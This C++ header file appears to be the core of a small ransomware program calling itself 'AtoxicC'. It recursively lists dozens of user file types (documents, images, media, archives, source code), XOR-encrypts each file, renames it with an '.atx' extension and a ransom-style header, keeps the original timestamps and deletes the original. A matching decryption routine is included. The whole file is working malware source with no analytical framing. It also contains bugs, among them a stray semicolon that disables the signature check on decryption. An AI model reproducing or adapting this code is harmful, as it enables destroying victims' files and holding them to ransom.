#pragma once
#include <Windows.h>
#include "cryptools.h"
#include "file.h"
#include "list.h"

// {3A77A59A-E49B-470B-8B5E-7E26318BA4C6}
static const GUID signature =
{ 0x3a77a59a, 0xe49b, 0x470b,{ 0x8b, 0x5e, 0x7e, 0x26, 0x31, 0x8b, 0xa4, 0xc6 } };
static const char* extention_crypted = ".atx";
static char *header = "This file is crypted by AtoxicC";
using byte = unsigned char;
using pbyte = unsigned char*;

static const char* extention_to_crypt[] = {
	".avi",".png",".jpg",".tif",".mp4",".mp3",".txt",".docx",".ppt",".doc",".pdf","jpeg",".ts",
	".xls",".log",".odt",".rtf",".tex",".dat",".pps",".tar",".xml",".m3u",".m4a",".mid",".mpa",
	".wav",".wma",".asf",".m4v",".mov",".mpg",".3dm",".3ds",".max",".obj",".bmp",".gif",".png",
	".tiff",".tga",".svg",".ps",".xls",".sql",".apk",".htm",".html",".php",".rss",".php",".xhtml",
	".ttf",".otf",".7z",".gz",".pkg",".zip",".py",".c",".h",".cpp",".torrent",".part",".odp",".hpp",".rar","."
};
static const size_t extention_count = sizeof(extention_to_crypt) / sizeof(*extention_to_crypt);

void ListPotentialEncryptedFile(LPCSTR path, list<FILE_DATA> *rep)
{
	RecursiveListFileWithMask(path, rep, &extention_crypted, 1);
}

void ListPotentialFile(LPCSTR path, list<FILE_DATA> *rep)
{
	RecursiveListFileWithMask(path, rep, extention_to_crypt, extention_count);
}


void AEncryptFile(FILE_DATA file, void* const key, size_t key_len)
{
	if (CanAccessFolder(file.cFilePath, GENERIC_READ | GENERIC_WRITE))
	{
		HANDLE hFile = CreateFileA(file.cFilePath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
		pbyte data;
		data = new byte[file.nFileSize.QuadPart];
		DWORD byteRead = 0;
		do
		{
			ReadFile(hFile, data, file.nFileSize.QuadPart, &byteRead, NULL);
		} while (byteRead != file.nFileSize.QuadPart);
		GUID signature_crypted;
		XOR((void*)&signature,(void*)&signature_crypted,sizeof(signature), key, key_len);
		XOR(data, data, file.nFileSize.QuadPart, key, key_len);
		CloseHandle(hFile);
		char newPath[MAX_PATH];
		sprintf_s(newPath, MAX_PATH, "%s%s", file.cFilePath, extention_crypted);
		hFile = CreateFileA(newPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, 0, NULL);
		WriteFile(hFile, header, strlen(header), NULL, NULL);
		WriteFile(hFile, &signature_crypted, sizeof(signature_crypted), NULL, NULL);
		WriteFile(hFile, data, file.nFileSize.QuadPart, NULL, NULL);
		SetFileTime(hFile, &file.ftCreationTime, &file.ftLastAccessTime, &file.ftLastWriteTime);
		delete[] data;
		CloseHandle(hFile);
		DeleteFileA(file.cFilePath);
	}
}

void ADecryptFile(FILE_DATA file, void* const key, size_t key_len)
{
	if (CanAccessFolder(file.cFilePath, GENERIC_READ | GENERIC_WRITE))
	{
		GUID new_sign;
		size_t size = file.nFileSize.QuadPart - strlen(header) - sizeof(new_sign);
		pbyte data = new byte[size];
		HANDLE hFile = CreateFileA(file.cFilePath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
		SetFilePointer(hFile, strlen(header), NULL, FILE_BEGIN);
		ReadFile(hFile, &new_sign, sizeof(new_sign), NULL, NULL);
		XOR(&new_sign, &new_sign, sizeof(new_sign), key, key_len);
		if (!memcmp(&signature, &new_sign, sizeof(new_sign)));
		{
			ReadFile(hFile, data, size, NULL, NULL);
			XOR(data, data, size, key, key_len);
			CloseHandle(hFile);
			char newPath[MAX_PATH];
			strcpy_s(newPath, MAX_PATH, file.cFilePath);
			newPath[searchstr(newPath, extention_crypted)] = '\0';
			hFile = CreateFileA(newPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, 0, NULL);
			WriteFile(hFile, data, size, NULL, NULL);
			DeleteFileA(file.cFilePath);
			SetFileTime(hFile, &file.ftCreationTime, &file.ftLastAccessTime, &file.ftLastWriteTime);
		}
		CloseHandle(hFile);
	}	
}

void AEncryptFileList(list<FILE_DATA>* file, void* const key, size_t key_len)
{
	if (file->size() == 0)
	{
		return;
	}
	CELL<FILE_DATA>* current = file->getPtr();
	do
	{
		AEncryptFile(current->data(), key, key_len);
		current = current->previous();
	} while (current != nullptr);
}

void ADecryptFileList(list<FILE_DATA>* file, void* const key, size_t key_len)
{
	if (file->size() == 0)
	{
		return;
	}
	CELL<FILE_DATA>* current = file->getPtr();
	do
	{
		ADecryptFile(current->data(), key, key_len);
		current = current->previous();
	}while (current != nullptr);
}